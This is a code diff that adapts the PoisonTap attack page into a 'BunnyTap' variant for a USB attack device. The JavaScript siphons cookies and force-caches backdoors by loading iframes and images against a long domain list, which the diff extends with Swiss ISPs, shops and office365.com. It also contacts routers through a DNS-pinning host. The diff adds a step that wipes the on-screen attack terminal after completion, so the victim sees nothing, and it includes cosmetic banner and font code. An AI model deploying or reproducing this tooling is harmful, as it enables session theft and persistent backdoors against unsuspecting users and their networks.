@@ -4,10 +4,9 @@
 <!-- https://samy.pl/poisontap -->
 <html><head></head>
 <body>
-
-Welcome to <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonTap</a></b>, by <a style="color: #E30B5D" href="https://samy.pl">samy kamkar</a>.<p>
-
-
+<div id="__title">
+Welcome to <b><a style="color: #E30B5D" href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a style="color: #E30B5D">Whistle Master</a>.<br>Based on <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a style="color: #E30B5D" href="https://samy.pl">samy kamkar</a>.<p>
+</div>
 <script>
 // This entire file can behave as both JS and HTML (note the open-comment at the top to prevent HTML from executing in a JS environment)
 
@@ -39,6 +38,9 @@ var dnsPinServer = '.ip.samy.pl';
 
 /* First poison the user's cache of common JS files from CDNs */
 var pre = '';
+// Gachnang 'count' start 
+var countMax = getDoms().length + 1;
+// Gachnang 'count' end
 
 backdoorRouters();
 
@@ -50,6 +52,12 @@ function addIframe(host)
 	var url = 'http://' + host + '/PoisonTap';
 	var iframe = document.createElement('iframe');
 	pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	
+	// Gachnang 'count' start
+	iframe.addEventListener('load', TargedLoad);
+	iframe.addEventListener('error', TargedError);
+	// Gachnang 'count' end
+	
 	iframe.src = url;
   //document.body.appendChild(iframe);
 
@@ -62,14 +70,46 @@ function addImg(host)
 {
 	var url = 'http://' + host + '/PoisonTap';
 	var img1 = document.createElement('img');
-	pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	//pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	
+	// Gachnang 'count' start
+	img1.addEventListener('load', TargedDone);
+	img1.addEventListener('error', TargedDone);
+	// Gachnang 'count' end
 	img1.src = url;
 
   // support www. version?
   //var img2 = document.createElement('img');
 	//img2.src = 'http://www.' + host + '/PoisonTap';
 }
+// Gachnang 'count' start
+var countDone = 0; 
+function TargedDone() {
+	pre += 'Siphoning cookies & force caching backdoor on ' + this.src + ' <br/>';
+	countDone++;
+		
+	finishedQuestion();
+}
 
+var blankOnFinish = true;
+function finishedQuestion(){
+	if(blankOnFinish &&	countDone >= countMax){
+		// 'you have seen nothing..'
+		// location = 'about:blank'; // <- can shutdown 'backdoor'..
+		setTimeout(function(){ 
+			document.getElementById('canvas').outerHTML = "";
+			document.getElementById('__ptterm').outerHTML = "";
+			document.getElementById('__title').outerHTML = "";
+			document.getElementById('__poisontap').outerHTML = "";
+		}, 30000);		
+	}
+	
+	var s = document.getElementById('__ptterm_status_d');
+	s.innerHTML = countDone;
+	var m = document.getElementById('__ptterm_status_m');
+	m.innerHTML = countMax;	
+}
+// Gachnang 'count' end
 
 // Contact common router IP addresses to cache backdoor onto the router
 function backdoorRouters()
@@ -80,8 +120,9 @@ function backdoorRouters()
   // give the pinned resolver a moment to update
   setTimeout(function() {
     var routers = getRouters();
-    for (var i in routers)
+    for (var i in routers){
       addIframe(routers[i] + dnsPinServer);
+	}
   }, 500);
 }
 
@@ -142,10 +183,15 @@ function ltext()
 		  l += pre.substr(0, 1);
 	  	pre = pre.substr(1);
 	  }
-		document.getElementById('__ptterm').innerHTML += l;
-		setTimeout(ltext, 10); // 10 looks better?
 
+	  // Gachnang 'scroller' start
+	  var scroller = document.getElementById('__ptterm_scroller');
+	  scroller.innerHTML += l;
+	  scroller.scrollTop = scroller.scrollHeight;
+	  // Gachnang 'scroller' end
+	  // before, instead of 'scroller', here was: document.getElementById('__ptterm').innerHTML += l;
 	}
+	setTimeout(ltext, 10); // 10 looks better?
 	return;
 
   // do letter at a time this way
@@ -162,7 +208,13 @@ function ltext()
 			}
 		}
 
-		document.getElementById('__ptterm').innerHTML += l;
+      // Gachnang 'scroller' start (code gets never reached...)
+	  var scroller = document.getElementById('__ptterm_scroller');
+	  scroller.innerHTML += l;
+	  scroller.scrollTop = scroller.scrollHeight;
+	  // Gachnang 'scroller' end
+	  // before, instead of 'scroller', here was:document.getElementById('__ptterm').innerHTML += l;
+	  
 		setTimeout(ltext, 1); // 10 looks better?
 	}
 }
@@ -173,7 +225,8 @@ function ptcanvas()
 	term.style.backgroundColor = '#000';
 	term.style.color = '#00bfff';
 	term.id = '__ptterm';
-	term.innerHTML = 'Welcome to <b><a href="http://samy.pl/poisontap">PoisonTap</a></b>, by <a href="http://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
+	//term.innerHTML = 'Welcome to <b><a href="http://samy.pl/poisontap">PoisonTap</a></b>, by <a href="http://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
+	term.innerHTML = 'Welcome to <b><a href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a>Whistle Master</a>.<br>Based on <b><a href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a href="https://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
   term.style.width = '100%';
   term.style.height = '100%';
   term.style.position = 'fixed';
@@ -196,6 +249,44 @@ function ptcanvas()
   //canvas.style.width = '100%';
   //canvas.style.height = '100%';
 
+  // Gachnang 'scroller' start
+  var scroller = d.createElement('div');
+  scroller.id = '__ptterm_scroller';
+  scroller.style.height = 'calc(100% - 64px)';
+  scroller.style.top = '50px';
+  scroller.style.overflow = 'hidden';
+  scroller.style.position = 'absolute';
+  scroller.style.display = 'block';
+  term.appendChild(scroller);
+  // Gachnang 'scroller' end
+  
+  // Gachnang 'count' start
+  var statusD = d.createElement('div');
+  statusD.id = '__ptterm_status_d';
+  statusD.innerHTML = '0';
+  statusD.style.width = '50px';
+  statusD.style.color = 'green';
+  
+  var statusM = d.createElement('div');
+  statusM.id = '__ptterm_status_m';
+  statusM.innerHTML = '0';
+  statusM.style.width = '50px';
+  statusM.style.color = 'gray';
+  
+  var status = d.createElement('div');
+  status.id = '__ptterm_status';
+  status.style.top = '50px';
+  status.style.right = '50px';
+  status.style.overflow = 'hidden';
+  status.style.position = 'absolute';
+  status.style.display = 'block';
+  
+  status.appendChild(statusD);
+  status.appendChild(statusM);
+  
+  term.appendChild(status)
+  // Gachnang 'count' end
+  
   //term.appendChild(canvas);
   d.body.appendChild(canvas);
   d.body.appendChild(term);
@@ -1695,7 +1786,187 @@ function ptcanvas()
     return this.returnData;
   };
 
+// Gachnang 'BunnyTab' start
+var fontmap_bunnytap = function() {
+    this.returnData = new Array();
+    this.col = 80;
+    this.row = 160;
+    this.cellLength = 22;
+    this.cellSpace = 22;
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      this.returnData[i] = {
+        shade : false,
+        fill : false,
+        stroke : false,
+        fillColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        strokeColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        size: 0,
+        position: {x:0, y:0, z:0},
+        rotate: {x:0, y:0, z:0}
+      };
+    };
+    this.fontMapData = [
+    {//B
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,3,3,4,0],[0,5,3,1,0],[0,5,2,1,0],[0,3,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//U
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,2,0,3,0],[0,5,0,5,0],[0,5,0,1,0],[0,3,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//N
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,4,0,5,0],[0,5,4,4,0],[0,5,3,5,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//N
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,4,0,5,0],[0,5,4,4,0],[0,5,3,5,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//Y
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,2,0],[0,4,0,1,0],[0,3,2,0,0],[0,0,5,0,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//T
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*3.2, y:this.row*-0.15, z:0}, 
+      map : [[0,2,5,1,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,2,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//A
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*4.2, y:this.row*-0.15, z:0}, 
+      map : [[0,0,0,2,0],[0,0,2,5,0],[0,2,1,1,0],[0,1,3,5,0],[0,1,0,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//P
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*5.2, y:this.row*-0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,5,3,4,0],[0,3,4,1,0],[0,5,0,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    }
+    ];
+    var lastMap = 0;
+    for(var i=0; i<this.fontMapData.length; i++) {
+      for(var j=0; j<this.fontMapData[i].map.length; j++) {
+        for(var k=0; k<this.fontMapData[i].map[j].length; k++) {
+          switch(this.fontMapData[i].map[j][k]) {
+            case 0:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = 0;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : 0,
+                y : 0,
+                z : 0
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 1:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+              break;
+            case 2:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 3:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:90};
+              break;
+            case 4:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:270};
+              break;
+            case 5:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
 
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+          };
+        };
+      };
+      lastMap += this.fontMapData[i].mapDataNum;
+    };
+    return this.returnData;
+  };
+ // Gachnang 'BunnyTab' stop
 
   var dynamic_001 = {// bold motion
     value : new Array(),
@@ -2080,7 +2351,8 @@ function ptcanvas()
       //fontMap_fullchara : fontmap_fullchara(),
       //fontmap_solidcell : fontmap_solidcell(),
       //fontmap_hackyou : fontmap_hackyou()
-      fontmap_poisontap: fontmap_poisontap()
+      fontmap_poisontap: fontmap_poisontap(),
+	  fontmap_bunnytap: fontmap_bunnytap()
     },
     dynamicFlag : 0,
     dynamicMap : new Object,
@@ -2134,6 +2406,9 @@ function ptcanvas()
              controll.endValue[num] = controll.staticMap.fontmap_hackyou[num];
              break;
            */
+		case "fontmap_bunnytap":
+		  controll.endValue[num] = controll.staticMap.fontmap_bunnytap[num];
+          break;
       };
       switch(controll.endValue[num].shade) {
         case true:
@@ -2362,6 +2637,15 @@ function ptcanvas()
     func : function() {
       controll.staticFlag = "freemap_disconnected";
       staticTransformSeries(800);
+    }
+  },
+  {
+    time : 1000,
+    func : function() {
+      init.nodeStrokeFlag = true;
+      controll.staticFlag = "fontmap_bunnytap";
+      //controll.staticFlag = "fontmap_solidcell";
+      staticTransformSeries(1000);
     }
   },
   /*
@@ -2882,7 +3166,35 @@ function getDoms()
     "wordpress.org",
     "1905.com",
     "wp.pl",
-    "google.ch",
+    
+	"google.ch",
+	"digitec.ch",
+	"swisscom.ch",
+	"upc.ch",
+	"sunrise.ch",
+	"wingo.ch",
+	"salt.ch",
+	"exlibris.ch",
+	"green.ch",
+	"hostpoint.ch",
+	"cyon.ch",
+	"hosttech.ch",
+	"switchplus.ch",
+	"zalando.ch",
+	"nespresso.com",
+	"brack.ch",
+	"alltron.ch",
+	"leshop.ch",
+	"microspot.ch",
+	"coopathome.ch",
+	"nettoshop.ch",
+	"siroop.ch",
+	"ricardo.ch",
+	"conrad.ch",
+	"bluewin.ch",
+	"office365.com",
+	"domian.com",
+	
     "doorblog.jp",
     "mama.cn",
     "google.dz",
